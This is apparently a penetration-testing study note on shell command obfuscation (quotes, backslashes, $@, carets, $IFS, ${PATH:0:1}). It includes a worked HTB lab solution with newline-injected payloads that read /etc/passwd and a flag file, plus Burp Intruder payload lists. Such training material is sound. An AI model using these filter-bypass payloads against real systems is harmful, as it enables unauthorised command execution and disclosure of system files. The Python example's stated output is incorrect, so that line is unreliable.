# 🛰️ Command Obfuscation Techniques

## Linux-Only Obfuscation Techniques

### Backslash Escaping

[!INFO] Method: 
```bash
# Original command
whoami

# Obfuscated with backslashes
w\ho\am\i
wh\oami
who\ami
```

**Advantages:**
- ✅ **Odd or even number of characters**
- ✅ **Flexible placement** 
- ✅ Works with **any position in command**

### Positional Parameter ($@)

[!INFO] Method:
```bash
# Original command
whoami

# Obfuscated with $@
who$@ami
w$@hoami
wh$@oami
```

**Technical Note:** `$@` represents positional parameters in Bash, but when empty, it's ignored during command execution.

### Combined Linux Techniques

[!INFO] Advanced Obfuscation:
```bash
# Multiple techniques combined
w\h'o'$@ami
c'a'\t$@${PATH:0:1}etc${PATH:0:1}passwd
```

---

## Windows-Only Obfuscation Techniques

### Caret Character (^)

[!INFO] Method:
```batch
# Original command
whoami

# Obfuscated with caret
who^ami
w^ho^ami
wh^o^ami
```

**PowerShell Alternative:**
```powershell
# Using backtick escape character
who`ami
wh`o`ami
```

---

## HTB Academy Lab Solution

### Challenge: Command Blacklist Bypass

[!INFO] Target: Find the content of `flag.txt` in the home folder of the previously discovered user.

**Previous Context:** 
- User found: `1nj3c70r` (from `/home` directory listing)
- Need to read: `/home/1nj3c70r/flag.txt`

### Step-by-Step Solution

[!SUCCESS] **Method 1: Quote Obfuscation**
```http
# URL-encoded payload
ip=127.0.0.1%0ac'a't$IFS${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt

# Decoded payload breakdown:
127.0.0.1           # Valid IP to pass initial validation
%0a                 # Newline injection operator (bypasses semicolon filter)
c'a't               # "cat" command obfuscated with single quotes
$IFS                # Space character replacement
${PATH:0:1}         # "/" character from environment variable
home                # Directory name
${PATH:0:1}         # Another "/"
1nj3c70r            # Username discovered in previous step
${PATH:0:1}         # Another "/"
flag.txt            # Target filename

# Actual executed command: cat /home/1nj3c70r/flag.txt
```

[!SUCCESS] **Method 2: Backslash Obfuscation (Linux)**
```http
ip=127.0.0.1%0ac\a\t$IFS${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

[!SUCCESS] **Method 3: Mixed Techniques**
```http
ip=127.0.0.1%0ac'a't$IFS${PATH:0:1}h'o'me${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

### Lab Answer Format

[!SUCCESS] Expected Flag Content:
```
HTB{...}
```

---

## Advanced Obfuscation Examples

### File Reading Techniques

[!INFO] **Obfuscating `cat /etc/passwd`:**
```bash
# Method 1: Quotes + Environment Variables
c'a't$IFS${PATH:0:1}e't'c${PATH:0:1}p'a'sswd

# Method 2: Backslash Escaping  
c\a\t$IFS${PATH:0:1}e\tc${PATH:0:1}pa\sswd

# Method 3: Mixed Techniques
c'a'\t$IFS${PATH:0:1}et'c'${PATH:0:1}pas'sw'd
```

### Directory Listing Techniques

[!INFO] **Obfuscating `ls -la /home`:**
```bash
# Method 1: Quote Obfuscation
l's'$IFS-l'a'$IFS${PATH:0:1}h'o'me

# Method 2: Tab Replacement + Quotes
l's'%09-l'a'%09${PATH:0:1}h'o'me
```

---

## Detection & Testing Methodology

### 1. Identify Blacklisted Commands

[!INFO] Test Common Commands:
```bash
# Test each command individually
whoami    # Often blacklisted
id        # Often blacklisted  
cat       # Often blacklisted
ls        # Often blacklisted
pwd       # Sometimes blacklisted
echo      # Rarely blacklisted
```

### 2. Test Obfuscation Methods

[!INFO] **Systematic Testing:**
```bash
# Step 1: Single quote method
w'h'o'am'i

# Step 2: Double quote method  
w"h"o"am"i

# Step 3: Backslash method (Linux)
w\ho\am\i

# Step 4: Mixed methods
w'h'o\am'i'
```

### 3. Character Combination

[!INFO] **Advanced Payload Construction:**
```bash
# Combine all bypass techniques:
# - Newline injection operator (%0a)
# - Environment variable space replacement ($IFS)  
# - Environment variable path extraction (${PATH:0:1})
# - Command obfuscation with quotes (c'a't)

127.0.0.1%0ac'a't$IFS${PATH:0:1}path${PATH:0:1}to${PATH:0:1}file
```

---

## Practical Applications

### 1. Web Application Testing

[!SUCCESS] **Burp Suite Intruder Setup:**
```
# Payload positions for command obfuscation
127.0.0.1%0a§c'a't§$IFS${PATH:0:1}etc${PATH:0:1}passwd

# Payload list:
cat
c'a't  
c"a"t
c\a\t
c'a'\t
```

### 2. Automated Obfuscation

[!EXAMPLE] **Python Script Example:**
```python
def obfuscate_command(cmd):
    """Simple quote-based obfuscation"""
    obfuscated = ""
    for i, char in enumerate(cmd):
        if i % 2 == 0:
            obfuscated += f"'{char}'"
        else:
            obfuscated += char
    return obfuscated

# Usage
original = "whoami"
obfuscated = obfuscate_command(original)  # w'h'oam'i'
```

---

## Key Takeaways

### ✅ **Universal Techniques**
- **Quote injection** works on all platforms
- **Environment variables** provide character flexibility
- **Multiple bypasses** can be combined

### 🎯 **Platform-Specific** 
- **Linux:** Backslash (`\`) and positional parameters (`$@`)
- **Windows:** Caret (`^`) and backtick (`` ` ``)

### 🔧 **Best Practices**
- **Test systematically** - one technique at a time
- **Combine methods** for complex filters
- **Use automation** for efficiency in assessments

This comprehensive approach to command obfuscation enables penetration testers to bypass sophisticated word-based filtering mechanisms while maintaining reliable command execution.